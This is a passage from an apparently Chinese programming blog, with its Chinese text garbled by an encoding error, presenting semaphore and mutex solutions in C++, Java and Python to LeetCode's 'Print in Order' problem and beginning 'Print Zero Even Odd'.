â€œfirstsecondthirdâ€<br>è§£é‡Š:<br>æœ‰ä¸‰ä¸ªçº¿ç¨‹ä¼šè¢«å¼‚æ­¥å¯åŠ¨ã€‚<br>è¾“å…¥ [1,2,3] è¡¨ç¤ºçº¿ç¨‹ A å°†ä¼šè°ƒç”¨ first() æ–¹æ³•ï¼Œçº¿ç¨‹ B å°†ä¼šè°ƒç”¨ second() æ–¹æ³•ï¼Œçº¿ç¨‹ C å°†ä¼šè°ƒç”¨ third() æ–¹æ³•ã€‚<br>æ­£ç¡®çš„è¾“å‡ºæ˜¯ â€œfirstsecondthirdâ€ã€‚<br>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: [1,3,2]<br>è¾“å‡º: â€œfirstsecondthirdâ€<br>è§£é‡Š:<br>è¾“å…¥ [1,3,2] è¡¨ç¤ºçº¿ç¨‹ A å°†ä¼šè°ƒç”¨ first() æ–¹æ³•ï¼Œçº¿ç¨‹ B å°†ä¼šè°ƒç”¨ third() æ–¹æ³•ï¼Œçº¿ç¨‹ C å°†ä¼šè°ƒç”¨ second() æ–¹æ³•ã€‚<br>æ­£ç¡®çš„è¾“å‡ºæ˜¯ â€œfirstsecondthirdâ€ã€‚</p><p>æç¤ºï¼š</p><p>å°½ç®¡è¾“å…¥ä¸­çš„æ•°å­—ä¼¼ä¹æš—ç¤ºäº†é¡ºåºï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸ä¿è¯çº¿ç¨‹åœ¨æ“ä½œç³»ç»Ÿä¸­çš„è°ƒåº¦é¡ºåºã€‚<br>ä½ çœ‹åˆ°çš„è¾“å…¥æ ¼å¼ä¸»è¦æ˜¯ä¸ºäº†ç¡®ä¿æµ‹è¯•çš„å…¨é¢æ€§ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/print-in-order">https://leetcode-cn.com/problems/print-in-order</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>ã€ç®€å•ã€‘éš¾åº¦çš„å”¯ä¸€ä¸€é“é¢˜ï¼Œ<del>çœ‹æ¥é¢˜åº“ä¹Ÿæ‰åˆšåˆšå»ºè®¾èµ·æ¥å‘</del></p><h3 id="è§£æ³•ä¸€ï¼šä¿¡å·é‡"><a href="#è§£æ³•ä¸€ï¼šä¿¡å·é‡" class="headerlink" title="è§£æ³•ä¸€ï¼šä¿¡å·é‡"></a>è§£æ³•ä¸€ï¼šä¿¡å·é‡</h3><p>ä½¿ç”¨è‡ªå¸¦é”çš„<strong>ä¿¡å·é‡</strong>ï¼ˆ<strong>Semaphore</strong>ï¼‰å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å®ç°æˆ‘ä»¬çš„åŠŸèƒ½ï¼Œå„å¤§è¯­è¨€çš„æ ‡å‡†åº“éƒ½æä¾›æœ‰è‡ªå·±çš„æ ‡å‡†ä¿¡å·é‡çš„å®ç°</p><p>å› ä¸ºåªéœ€è¦ä¿è¯<code>second()</code>å’Œ<code>third()</code>æ–¹æ³•åœ¨<code>first()</code>æ–¹æ³•ä¹‹åæ‰§è¡Œå³å¯ï¼Œæ•…ä¸éœ€è¦ä¸º<code>first()</code>æ–¹æ³•ä¸Šé”</p><p>å¤§è‡´æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ä¸º<code>second()</code>å’Œ<code>third()</code>è®¾ç½®ä¸¤ä¸ªä¿¡å·é‡s2ï¼Œs3ï¼Œç½®ä¸º0</li><li>æ‰§è¡Œ<code>first()</code>æ–¹æ³•æ—¶è§£é”s2</li><li>æ‰§è¡Œ<code>second()</code>æ–¹æ³•æ—¶å…ˆç­‰å¾…s2è§£é”ï¼Œåœ¨æœ€åé”ä¸Šs2å¹¶è§£é”s3</li><li>æ‰§è¡Œ<code>third()</code>æ–¹æ³•æ—¶å…ˆç­‰å¾…s3è§£é”ï¼Œåœ¨æœ€åé”ä¸Šs3</li></ul><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><h4 id="C-ç‰ˆ"><a href="#C-ç‰ˆ" class="headerlink" title="C++ç‰ˆ"></a>C++ç‰ˆ</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">sem_t</span> sem_pthread_2, sem_pthread_3;</span><br><span class="line">    <span class="built_in">Foo</span>() </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;sem_pthread_2,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">sem_init</span>(&amp;sem_pthread_3,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">first</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFirst)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="comment">// printFirst() outputs &quot;first&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printFirst</span>();</span><br><span class="line">        <span class="built_in">sem_post</span>(&amp;sem_pthread_2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">second</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printSecond)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">sem_wait</span>(&amp;sem_pthread_2);    </span><br><span class="line">        <span class="comment">// printSecond() outputs &quot;second&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printSecond</span>();</span><br><span class="line">        <span class="built_in">sem_post</span>(&amp;sem_pthread_3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">third</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printThird)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">sem_wait</span>(&amp;sem_pthread_3);    </span><br><span class="line">        <span class="comment">// printThird() outputs &quot;third&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printThird</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/ywsX3tVlv1M8zGO.png" alt="image.png"></p><h4 id="Javaç‰ˆ"><a href="#Javaç‰ˆ" class="headerlink" title="Javaç‰ˆ"></a>Javaç‰ˆ</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> </span><br><span class="line">&#123;</span><br><span class="line">    Semaphore sem_thread_2,sem_thread_3;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Foo</span><span class="params">()</span> </span><br><span class="line">    &#123;</span><br><span class="line">        sem_thread_2 = <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">0</span>);</span><br><span class="line">        sem_thread_3 = <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span><br><span class="line">    &#123;        </span><br><span class="line">        <span class="comment">// printFirst.run() outputs &quot;first&quot;. Do not change or remove this line.</span></span><br><span class="line">        printFirst.run();</span><br><span class="line">        sem_thread_2.release();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span><br><span class="line">    &#123;</span><br><span class="line">        sem_thread_2.acquire();</span><br><span class="line">        <span class="comment">// printSecond.run() outputs &quot;second&quot;. Do not change or remove this line.</span></span><br><span class="line">        printSecond.run();</span><br><span class="line">        sem_thread_3.release();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span><br><span class="line">    &#123;</span><br><span class="line">        sem_thread_3.acquire();    </span><br><span class="line">        <span class="comment">// printThird.run() outputs &quot;third&quot;. Do not change or remove this line.</span></span><br><span class="line">        printThird.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/jZB2YJQikrSmGs6.png" alt="image.png"></p><blockquote><p>åœ¨å¤šçº¿ç¨‹ä¸ŠJavaçš„é€Ÿåº¦ä¼¼ä¹æ¯”C++å¿«å¥½å¤šå‘¢</p></blockquote><h4 id="Pythonç‰ˆ"><a href="#Pythonç‰ˆ" class="headerlink" title="Pythonç‰ˆ"></a>Pythonç‰ˆ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Semaphore</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.sem_thread_s2 = Semaphore(<span class="number">0</span>)</span><br><span class="line">        self.sem_thread_s3 = Semaphore(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">first</span>(<span class="params">self, printFirst: <span class="string">&#x27;Callable[[], None]&#x27;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># printFirst() outputs &quot;first&quot;. Do not change or remove this line.</span></span><br><span class="line">        printFirst()</span><br><span class="line">        self.sem_thread_s2.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">second</span>(<span class="params">self, printSecond: <span class="string">&#x27;Callable[[], None]&#x27;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.sem_thread_s2.acquire()</span><br><span class="line">        <span class="comment"># printSecond() outputs &quot;second&quot;. Do not change or remove this line.</span></span><br><span class="line">        printSecond()</span><br><span class="line">        self.sem_thread_s3.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">third</span>(<span class="params">self, printThird: <span class="string">&#x27;Callable[[], None]&#x27;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.sem_thread_s3.acquire()</span><br><span class="line">        <span class="comment"># printThird() outputs &quot;third&quot;. Do not change or remove this line.</span></span><br><span class="line">        printThird()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/d5j9Aw8FbolXHZ1.png" alt="image.png"></p><h3 id="è§£æ³•äºŒï¼šäº’æ–¥é”"><a href="#è§£æ³•äºŒï¼šäº’æ–¥é”" class="headerlink" title="è§£æ³•äºŒï¼šäº’æ–¥é”"></a>è§£æ³•äºŒï¼šäº’æ–¥é”</h3><p>å’Œè§£æ³•ä¸€çš„æ€è·¯å…¶å®æ˜¯ç±»ä¼¼çš„</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><h4 id="C-ç‰ˆ-1"><a href="#C-ç‰ˆ-1" class="headerlink" title="C++ç‰ˆ"></a>C++ç‰ˆ</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    std::mutex lock_2, lock_3;</span><br><span class="line">    <span class="built_in">Foo</span>() </span><br><span class="line">    &#123;</span><br><span class="line">        lock_2.<span class="built_in">lock</span>();</span><br><span class="line">        lock_3.<span class="built_in">lock</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">first</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printFirst)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        <span class="comment">// printFirst() outputs &quot;first&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printFirst</span>();</span><br><span class="line">        lock_2.<span class="built_in">unlock</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">second</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printSecond)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock_2.<span class="built_in">lock</span>();    </span><br><span class="line">        <span class="comment">// printSecond() outputs &quot;second&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printSecond</span>();</span><br><span class="line">        lock_3.<span class="built_in">unlock</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">third</span><span class="params">(function&lt;<span class="type">void</span>()&gt; printThird)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        lock_3.<span class="built_in">lock</span>();</span><br><span class="line">        <span class="comment">// printThird() outputs &quot;third&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="built_in">printThird</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/I92dekCg5LE14Wm.png" alt="image.png"></p><h4 id="Javaç‰ˆ-1"><a href="#Javaç‰ˆ-1" class="headerlink" title="Javaç‰ˆ"></a>Javaç‰ˆ</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">boolean</span> first_finished, second_finished;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Foo</span><span class="params">()</span> </span><br><span class="line">    &#123;</span><br><span class="line">        first_finished = <span class="literal">false</span>;</span><br><span class="line">        second_finished = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">first</span><span class="params">(Runnable printFirst)</span> <span class="keyword">throws</span> InterruptedException </span><br><span class="line">    &#123;        </span><br><span class="line">        <span class="comment">// printFirst.run() outputs &quot;first&quot;. Do not change or remove this line.</span></span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            printFirst.run();</span><br><span class="line">            first_finished = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">this</span>.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">second</span><span class="params">(Runnable printSecond)</span> <span class="keyword">throws</span> InterruptedException </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(!first_finished)</span><br><span class="line">                <span class="built_in">this</span>.wait();</span><br><span class="line">            first_finished = <span class="literal">false</span>;</span><br><span class="line">            printSecond.run();</span><br><span class="line">            second_finished = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">this</span>.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// printSecond.run() outputs &quot;second&quot;. Do not change or remove this line.</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">third</span><span class="params">(Runnable printThird)</span> <span class="keyword">throws</span> InterruptedException </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(!second_finished)</span><br><span class="line">                wait();</span><br><span class="line">            second_finished = <span class="literal">false</span>;</span><br><span class="line">            printThird.run();</span><br><span class="line">            notifyAll();</span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="comment">// printThird.run() outputs &quot;third&quot;. Do not change or remove this line.</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/IKUN2ePcZErvWkh.png" alt="image.png"></p><h4 id="Pythonç‰ˆ-1"><a href="#Pythonç‰ˆ-1" class="headerlink" title="Pythonç‰ˆ"></a>Pythonç‰ˆ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.lock_s2 = Lock()</span><br><span class="line">        self.lock_s3 = Lock()</span><br><span class="line">        self.lock_s2.acquire()</span><br><span class="line">        self.lock_s3.acquire()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">first</span>(<span class="params">self, printFirst: <span class="string">&#x27;Callable[[], None]&#x27;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># printFirst() outputs &quot;first&quot;. Do not change or remove this line.</span></span><br><span class="line">        printFirst()</span><br><span class="line">        self.lock_s2.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">second</span>(<span class="params">self, printSecond: <span class="string">&#x27;Callable[[], None]&#x27;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.lock_s2.acquire()</span><br><span class="line">        <span class="comment"># printSecond() outputs &quot;second&quot;. Do not change or remove this line.</span></span><br><span class="line">        printSecond()</span><br><span class="line">        self.lock_s3.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">third</span>(<span class="params">self, printThird: <span class="string">&#x27;Callable[[], None]&#x27;</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.lock_s3.acquire()</span><br><span class="line">        <span class="comment"># printThird() outputs &quot;third&quot;. Do not change or remove this line.</span></span><br><span class="line">        printThird()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/02/n9yMJ8Bks5OFhYp.png" alt="GUBN_FI1CF7RB06CDLJLJV2.png"></p><h1 id="0x01-ä¸­ç­‰"><a href="#0x01-ä¸­ç­‰" class="headerlink" title="0x01.ä¸­ç­‰"></a>0x01.ä¸­ç­‰</h1><h2 id="0x00-æ‰“å°é›¶ä¸å¥‡å¶æ•°"><a href="#0x00-æ‰“å°é›¶ä¸å¥‡å¶æ•°" class="headerlink" title="0x00.æ‰“å°é›¶ä¸å¥‡å¶æ•°"></a>0x00.<a href="https://leetcode-cn.com/problems/print-zero-even-odd/">æ‰“å°é›¶ä¸å¥‡å¶æ•°</a></h2><blockquote><p>å‡è®¾æœ‰è¿™ä¹ˆä¸€ä¸ªç±»ï¼š</p><p>class ZeroEvenOdd {<br>  public ZeroEvenOdd(int n) { â€¦ }      &#x2F;&#x2F; æ„é€ å‡½æ•°<br>  public void zero(printNumber) { â€¦ }  &#x2F;&#x2F; ä»…æ‰“å°å‡º 0<br>  public void even(printNumber) { â€¦ }  &#x2F;&#x2F; ä»…æ‰“å°å‡º å¶æ•°<br>  public void odd(printNumber) { â€¦ }   &#x2F;&#x2F; ä»…æ‰“å°å‡º å¥‡æ•°<br>}<br>ç›¸åŒçš„ä¸€ä¸ª ZeroEvenOdd ç±»å®ä¾‹å°†ä¼šä¼ é€’ç»™ä¸‰ä¸ªä¸åŒçš„çº¿ç¨‹ï¼š</p><p>çº¿ç¨‹ A å°†è°ƒç”¨ zero()ï¼Œå®ƒåªè¾“å‡º 0 ã€‚<br>çº¿ç¨‹ B å°†è°ƒç”¨ even()ï¼Œå®ƒåªè¾“å‡ºå¶æ•°ã€‚<br>çº¿ç¨‹ C å°†è°ƒç”¨ odd()ï¼Œå®ƒåªè¾“å‡ºå¥‡æ•°ã€‚<br>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ª printNumber æ–¹æ³•æ¥è¾“å‡ºä¸€ä¸ªæ•´æ•°ã€‚è¯·ä¿®æ”¹ç»™å‡ºçš„ä»£ç ä»¥è¾“å‡ºæ•´æ•°åºåˆ— 010203040506â€¦ ï¼Œå…¶ä¸­åºåˆ—çš„é•¿åº¦å¿…é¡»ä¸º 2nã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥ï¼šn &#x3D; 2<br>è¾“å‡ºï¼šâ€0102â€<br>è¯´æ˜ï¼šä¸‰æ¡çº¿ç¨‹å¼‚æ­¥æ‰§è¡Œï¼Œå…¶ä¸­ä¸€ä¸ªè°ƒç”¨ zero()ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨ even()ï¼Œæœ€åä¸€ä¸ªçº¿ç¨‹è°ƒç”¨odd()ã€‚æ­£ç¡®çš„è¾“å‡ºä¸º â€œ0102â€ã€‚<br>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥ï¼šn &#x3D; 5<br>è¾“å‡ºï¼šâ€0102030405â€</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/print-zero-even-odd">https://leetcode-cn.com/problems/print-zero-even-odd</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><h3 id="è§£æ³•ä¸€ï¼šä¿¡å·é‡-1"><a href="#è§£æ³•ä¸€ï¼šä¿¡å·é‡-1" class="headerlink" title="è§£æ³•ä¸€ï¼šä¿¡å·é‡"></a>è§£æ³•ä¸€ï¼šä¿¡å·é‡</h3><p>ä¾ç„¶å¯ä»¥ä½¿ç”¨ä¿¡å·é‡æ¥è§£å†³è¿™ä¸ªé—®é¢˜</p><p>éœ€è¦æ³¨æ„çš„æ˜¯æ•°å­—<code>0</code>æ˜¯éœ€è¦ç¬¬ä¸€ä¸ªè¢«æ‰“å°çš„ï¼Œæ•…æ‰“å°<code>0</code>çš„çº¿ç¨‹çš„<strong>åˆå§‹ä¿¡å·é‡åº”å½“è®¾ä¸º1</strong></p><h4 id="C-ç‰ˆ-2"><a href="#C-ç‰ˆ-2" class="headerlink" title="C++ç‰ˆ"></a>C++ç‰ˆ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;semaphore.h&gt;</span><br><span class="line">class ZeroEvenOdd </span><br><span class="line">&#123;</span><br><span class="line">private:</span><br><span class="line">    int n, count = 0;</span><br><span class="line">    sem_t sem_zero, sem_even, sem_odd;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    ZeroEvenOdd(int n) </span><br><span class="line">    &#123;</span><br><span class="line">        this-&gt;n = n;</span><br><span class="line">        sem_init(&amp;sem_zero,0,1);</span><br><span class="line">        sem_init(&amp;sem_even,0,0);</span><br><span class="line">        sem_init(&amp;sem_odd,0,0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // printNumber(x) outputs &quot;x&quot;, where x is an integer.</span><br><span class="line">    void zero(function&lt;void(int)&gt; printNumber) 